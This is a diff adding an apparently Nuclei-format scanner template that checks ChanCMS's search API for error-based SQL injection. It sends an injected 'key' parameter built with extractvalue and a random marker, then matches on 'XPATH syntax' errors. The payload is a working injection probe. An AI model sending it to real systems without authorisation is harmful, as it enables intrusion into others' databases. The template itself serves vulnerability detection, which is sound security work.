@@ -1,0 +1,31 @@
+id: ChanCms-search-SqlInjection
+
+info:
+  name: ChanCms-search-SqlInjection
+  author: iSee857
+  severity: medium
+  description: |
+    ChanCms-search-SqlInjection
+
+variables:
+  randStr: "{{md5(rand_base(5))}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/search?key=%27%20and%20extractvalue(1,concat(0x7e,%27{{randStr}}%27,0x7e))--%20a"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{randStr}}"
+          - "XPATH syntax"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+          - 500
+        condition: or
